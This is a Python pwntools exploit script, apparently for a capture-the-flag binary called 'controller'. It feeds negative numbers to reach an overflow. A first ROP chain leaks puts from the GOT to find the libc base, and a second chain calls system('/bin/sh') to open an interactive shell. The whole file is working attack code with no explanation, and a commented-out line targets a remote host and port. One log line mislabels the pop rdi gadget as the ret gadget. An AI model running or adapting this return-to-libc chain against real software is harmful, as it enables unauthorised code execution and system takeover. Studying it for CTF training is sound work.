#!/usr/bin/env python3

from pwn import *

#p = remote("138.68.141.182", 31116)
p = process("./controller")

elf = ELF("./controller")
libc = ELF("libc6_2.31-9_amd64.so")
#libc = ELF("./libc.so.6")
rop = ROP(elf)

PUTS_PLT = elf.plt["puts"]
PUTS_GOT = elf.got["puts"]
MAIN = elf.symbols["main"]
RET = rop.find_gadget(['ret'])[0]

pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]


log.info("Puts@plt: " + hex(PUTS_PLT))
log.info("Pop rdi gadget: " + hex(pop_rdi))
log.info("ret gadget: " + hex(pop_rdi))
log.info("main address: " + hex(MAIN))


print(p.recvuntil(': ').decode())
p.sendline('-65338')
p.sendline('-1')
print(p.recvuntil('> ').decode())
p.sendline('3')
print(p.recvuntil('> ').decode())

payload = b'A'*40
payload += p64(pop_rdi)
payload += p64(PUTS_GOT)
payload += p64(PUTS_PLT)
payload += p64(MAIN)

p.sendline(payload)
print(p.recvline().decode())
puts_addr = u64(p.recvline().strip().ljust(8,b'\x00'))


libc.address = puts_addr - libc.sym['puts']
BIN_SH = next(libc.search(b"/bin/sh")) 
SYSTEM = libc.sym["system"]

log.info("leaked puts: " + hex(puts_addr))
log.info("libc base addr: " + hex(libc.address))
log.info("bin/sh: " + hex(BIN_SH - libc.address))
log.info("system: " + hex(SYSTEM - libc.address))


print(p.recvuntil(': ').decode())
p.sendline('-65338')
p.sendline('-1')
print(p.recvuntil('> ').decode())
p.sendline('3')
print(p.recvuntil('> ').decode())

payload = b'A'*40 
payload += p64(pop_rdi)
payload += p64(BIN_SH)
payload += p64(SYSTEM)

p.sendline(payload)
p.interactive()
